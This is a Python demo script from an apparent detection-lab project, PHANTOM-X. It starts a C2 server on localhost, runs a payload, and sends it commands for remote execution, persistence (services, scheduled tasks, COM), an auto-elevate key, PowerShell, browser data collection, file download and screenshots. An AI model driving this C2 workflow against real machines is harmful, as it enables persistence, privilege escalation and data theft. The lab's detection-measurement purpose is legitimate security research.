#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PHANTOM-X :: the capability demonstration
===============================================================================
demo_capabilities.py -- Drives the technique capability library end to end, on
this machine, and prints what the C2 server recorded.

WHY A DEMO SCRIPT
    The lab has a lot of moving parts -- a VM, a network segment, a
    telemetry collector, a rule evaluator -- and the capability library is
    the part you want to poke at first. It should not need all of them.

    So this script does the smallest possible version of the lab on one
    machine:

        1. start the C2 server
        2. start the capability payload
        3. ask the server to run the techniques
        4. print the audit log the server wrote

    Everything it touches is on this machine, and everything it creates
    it removes again: the service, the scheduled task, the COM class and
    the auto-elevate key are created and then deleted by the capability
    itself.

    THIS IS NOT THE MEASUREMENT.
        The measurement needs the isolated VM and the telemetry collector,
        because the point is what the ENDPOINT sees, not what the server
        says it sent. This script shows the operator's side.

USAGE
    python3 demo_capabilities.py
    python3 demo_capabilities.py --payload ..\\dist\\variants\\px_payload_caps.exe
    python3 demo_capabilities.py --technique recon --arg sysinfo
"""

from __future__ import annotations

import argparse
import json
import os
import subprocess
import sys
import tempfile
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)


def find_payload(explicit, arm):
    """Locate a payload build for one arm.

    The DGA arm is not usable here: it connects to a generated hostname
    that only resolves inside the lab segment, where the DNS helper is
    running. The demo runs on one machine with no helper, so the arms it
    uses are the ones that connect to an address.
    """
    if explicit:
        p = os.path.abspath(explicit)
        return p if os.path.isfile(p) else None
    p = os.path.join(ROOT, "dist", "variants", f"px_payload_{arm}.exe")
    return p if os.path.isfile(p) else None


def find_server(explicit):
    """Locate the Go C2 server."""
    if explicit:
        p = os.path.abspath(explicit)
        return p if os.path.isfile(p) else None
    for rel in (
        os.path.join("phase5_network", "px_c2.exe"),
        os.path.join("dist", "native", "px_c2.exe"),
    ):
        p = os.path.join(ROOT, rel)
        if os.path.isfile(p):
            return p
    return None


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(
        description="Drive the technique capability library against the lab C2")
    ap.add_argument("--payload", default=None,
                    help="path to a capability-capable payload build")
    ap.add_argument("--server", default=None,
                    help="path to the Go C2 server")
    ap.add_argument("--technique", default=None,
                    help="run only this technique")
    ap.add_argument("--arg", default="",
                    help="the arguments for that technique")
    ap.add_argument("--port", type=int, default=9099)
    args = ap.parse_args(argv)

    caps_payload = find_payload(args.payload, "caps")
    if not caps_payload:
        print("error: no capability-capable payload found.", file=sys.stderr)
        print("  build one:  cd phase3_fileless\\loader && "
              ".\\build_variants.ps1", file=sys.stderr)
        return 2

    xfer_payload = find_payload(None, "xfer")

    server = find_server(args.server)
    if not server:
        print("error: the C2 server is not built.", file=sys.stderr)
        print("  build it:  cd phase5_network && go build -o px_c2.exe .",
              file=sys.stderr)
        return 2

    work = tempfile.mkdtemp(prefix="px_demo_")
    audit = os.path.join(work, "c2_audit.jsonl")
    quarantine = os.path.join(work, "quarantine")
    canary = os.path.join(work, "canary.txt")
    with open(canary, "w", encoding="utf-8") as fh:
        fh.write("PHANTOM-X DEMO CANARY\n")

    print("=" * 74)
    print("PHANTOM-X :: CAPABILITY DEMONSTRATION")
    print("=" * 74)
    print(f"  payload : {caps_payload}")
    print(f"  server  : {server}")
    print(f"  audit   : {audit}")
    print()

    if args.technique:
        cap_commands = [f"cap 1 {args.technique} {args.arg}".strip()]
        xfer_commands = []
    else:
        cap_commands = [
            "list",
            "exec 1 whoami",
            "exec 1 ver",
            "exec 1 echo PHANTOMX_REMOTE_SHELL_WORKS",
            "cap 1 list",
            "cap 1 recon sysinfo",
            "cap 1 service",
            "cap 1 schtask",
            "cap 1 com",
            "cap 1 elev",
            "cap 1 proxy",
            "cap 1 ps Write-Output PHANTOMX_DEMO",
            "cap 1 browser",
        ]
        xfer_commands = [f"dl 1 {canary}", "shot 1"]

    _session(server, caps_payload, args.port, audit, quarantine, work,
             "caps", cap_commands)

    if xfer_payload and xfer_commands:
        print()
        print("=" * 74)
        print("AND THE FILE TRANSFER, FROM THE xfer ARM")
        print("=" * 74)
        print(f"  payload : {xfer_payload}")
        print()
        _session(server, xfer_payload, args.port, audit, quarantine, work,
                 "xfer", xfer_commands)

    _print_audit(audit)
    print()
    print(f"  the audit log and the quarantine directory are in: {work}")
    return 0


def _session(server, payload, port, audit, quarantine, work, label,
             commands) -> None:
    """Run one session: server, payload, commands, then shut both down."""
    payload_log = os.path.join(work, f"payload_{label}.txt")
    server_log = os.path.join(work, f"server_{label}.txt")

    srv = subprocess.Popen(
        [server, "--host", "127.0.0.1", "--port", str(port),
         "--log", audit, "--quarantine", quarantine],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT, text=True, bufsize=1)
    time.sleep(1.2)

    env = dict(os.environ)
    env["PX_C2_HOST"] = "127.0.0.1"
    env["PX_C2_PORT"] = str(port)
    pay = subprocess.Popen([payload], env=env,
                           stdout=subprocess.PIPE,
                           stderr=subprocess.STDOUT, text=True)
    time.sleep(1.5)

    try:
        for c in commands:
            srv.stdin.write(c + "\n")
            srv.stdin.flush()
            time.sleep(0.8)
        time.sleep(1.5)
    except (BrokenPipeError, OSError):
        pass
    finally:
        try:
            srv.stdin.write("quit\n")
            srv.stdin.flush()
        except (BrokenPipeError, OSError):
            pass
        pay.terminate()
        try:
            out, _ = pay.communicate(timeout=5)
        except subprocess.TimeoutExpired:
            pay.kill()
            out, _ = pay.communicate()
        if out:
            with open(payload_log, "w", encoding="utf-8") as fh:
                fh.write(out)
        srv.terminate()
        try:
            sout, _ = srv.communicate(timeout=5)
        except subprocess.TimeoutExpired:
            srv.kill()
            sout, _ = srv.communicate()
        if sout:
            with open(server_log, "w", encoding="utf-8") as fh:
                fh.write(sout)
        srv.terminate()
        try:
            srv.wait(timeout=5)
        except subprocess.TimeoutExpired:
            srv.kill()

    _print_server_log(server_log)
    _print_payload_log(payload_log)
    print()
    print(f"  the audit log and the quarantine directory are in: {work}")
    return 0


def _print_server_log(path: str) -> None:
    """The operator's console.

    This is what the person at the keyboard sees: the command they typed,
    and the output that came back from the Windows machine.
    """
    if not os.path.isfile(path):
        return
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        lines = [ln.rstrip() for ln in fh if ln.strip()]
    if not lines:
        return
    print()
    print("-" * 74)
    print("THE OPERATOR CONSOLE")
    print("-" * 74)
    for ln in lines:
        if len(ln) > 108:
            ln = ln[:108] + "..."
        print(f"  {ln}")
    print()


def _print_payload_log(path: str) -> None:
    """The payload's own view of the session."""
    if not os.path.isfile(path):
        return
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        lines = [ln.rstrip() for ln in fh if ln.strip()]
    if not lines:
        return
    print()
    print("-" * 74)
    print("WHAT THE PAYLOAD DID")
    print("-" * 74)
    for ln in lines:
        if len(ln) > 108:
            ln = ln[:108] + "..."
        print(f"  {ln}")
    print()


def _print_audit(path: str) -> None:
    if not os.path.isfile(path):
        print("  (no audit log was written)")
        return
    print()
    print("-" * 74)
    print("WHAT THE SERVER RECORDED")
    print("-" * 74)
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        for line in fh:
            line = line.strip()
            if not line:
                continue
            try:
                rec = json.loads(line)
            except json.JSONDecodeError:
                continue
            kind = rec.get("kind", "?")
            if kind == "capabilities":
                print(f"  capabilities : {rec.get('capabilities')}")
            elif kind == "capability":
                extra = (rec.get("args") or "").strip()
                print(f"  capability   : {rec.get('technique')}"
                      + (f" {extra}" if extra else ""))
            elif kind == "result":
                out = (rec.get("output") or "").replace("\n", " ").strip()
                if len(out) > 100:
                    out = out[:100] + "..."
                print(f"  result       : {out}")
            elif kind == "file_transfer":
                print(f"  transfer     : {rec.get('bytes')} bytes, "
                      f"sha256 {str(rec.get('sha256'))[:16]}")
            elif kind == "session_open":
                print("  session      : opened")


if __name__ == "__main__":
    sys.exit(main())
